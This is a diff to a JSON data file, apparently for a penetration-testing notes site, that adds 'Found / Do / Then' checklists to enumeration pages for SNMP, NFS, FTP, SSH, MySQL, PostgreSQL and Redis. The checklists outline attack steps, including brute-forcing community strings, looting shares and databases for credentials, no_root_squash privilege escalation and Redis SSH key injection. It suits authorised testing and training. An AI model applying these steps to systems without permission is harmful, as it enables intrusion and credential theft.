@@ -22070,6 +22431,7 @@
       "title": "161, 162, 10161, 10162 - SNMP",
       "source": "Enumeration/Services/161,162,10161,10162 - SNMP.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [
         "SNMP",
@@ -22081,6 +22443,19 @@
         {
           "type": "paragraph",
           "text": "`161/udp open snmp`"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `161/udp open snmp`.",
+            "Do: brute or test community strings; default is often `public`.",
+            "Then: walk process args, installed software, users, shares, and extend entries for creds or command execution."
+          ]
         },
         {
           "type": "heading",
@@ -22225,6 +22600,10 @@
           "text": "Detailed SNMP Walks"
         },
         {
+          "type": "paragraph",
+          "text": "After finding a community string, pull host-specific data based on the target OS."
+        },
+        {
           "type": "heading",
           "depth": 3,
           "text": "Detailed SNMP Walks - Windows"
@@ -22322,6 +22701,7 @@
       "title": "2049 - NFS",
       "source": "Enumeration/Services/2049 - NFS.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [
         "NFS",
@@ -22333,6 +22713,19 @@
         {
           "type": "paragraph",
           "text": "`2049/tcp open nfs 3-4 (RPC #100003)`"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `2049/tcp open nfs`.",
+            "Do: list exports, mount readable shares, and preserve file permissions while looting.",
+            "Then: check for private keys, writable exports, and `no_root_squash` privesc paths."
+          ]
         },
         {
           "type": "heading",
@@ -22435,6 +22828,7 @@
       "title": "21 - FTP",
       "source": "Enumeration/Services/21 - FTP.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [
         "FTP",
@@ -22456,6 +22850,19 @@
           "items": [
             "Always try anonymous login.",
             "Common anonymous creds: `anonymous:anonymous`, `anonymous:<blank>`, `ftp:ftp`."
+          ]
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `21/tcp open ftp`.",
+            "Do: grab banner, try anonymous/default access, then test known creds only if you have them.",
+            "Then: loot readable files, look for web-root upload paths, credentials, backups, or private keys."
           ]
         },
         {
@@ -22581,6 +22988,7 @@
       "title": "22 - SSH",
       "source": "Enumeration/Services/22 - SSH.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [
         "SSH",
@@ -22591,6 +22999,19 @@
         {
           "type": "paragraph",
           "text": "`22/tcp open ssh`"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `22/tcp open ssh`.",
+            "Do: fingerprint auth methods and test known creds or private keys.",
+            "Then: crack protected keys, log in, stabilize shell, and move to post-exploitation/privesc."
+          ]
         },
         {
           "type": "heading",
@@ -22692,9 +23113,23 @@
       "title": "3306 - MySQL",
       "source": "Enumeration/Services/3306 - MySQL.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [],
       "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `3306/tcp open mysql`.",
+            "Do: connect with discovered creds and enumerate databases/tables.",
+            "Then: loot application secrets, password hashes, or writable admin records."
+          ]
+        },
         {
           "type": "heading",
           "depth": 2,
@@ -22775,9 +23210,23 @@
       "title": "5432 - PostgreSQL",
       "source": "Enumeration/Services/5432 - PostgreSQL.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [],
       "blocks": [
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `5432/tcp open postgresql`.",
+            "Do: connect with discovered creds and list databases/tables.",
+            "Then: loot application secrets, hashes, or data that points to initial access."
+          ]
+        },
         {
           "type": "heading",
           "depth": 2,
@@ -22859,6 +23308,7 @@
       "title": "6379 - Redis",
       "source": "Enumeration/Services/6379 - Redis.md",
       "tab": "Services",
+      "note_group": "Services",
       "type": "service",
       "tags": [
         "Redis",
@@ -22871,6 +23321,19 @@
         {
           "type": "paragraph",
           "text": "`6379/tcp open redis`"
+        },
+        {
+          "type": "heading",
+          "depth": 2,
+          "text": "Found / Do / Then"
+        },
+        {
+          "type": "list",
+          "items": [
+            "Found: `6379/tcp open redis`.",
+            "Do: check whether Redis allows unauthenticated or password-authenticated `INFO`.",
+            "Then: review config/write ability and consider SSH key injection only when Redis can write to a useful path."
+          ]
         },
         {
           "type": "heading",
@@ -22997,6 +23460,7 @@
       "title": "grep Cheatsheet",
       "source": "Tools/grep Cheatsheet.md",
       "tab": "Tools",
+      "note_group": "Tools",
       "type": "tool-note",
       "tags": [
         "Looting",
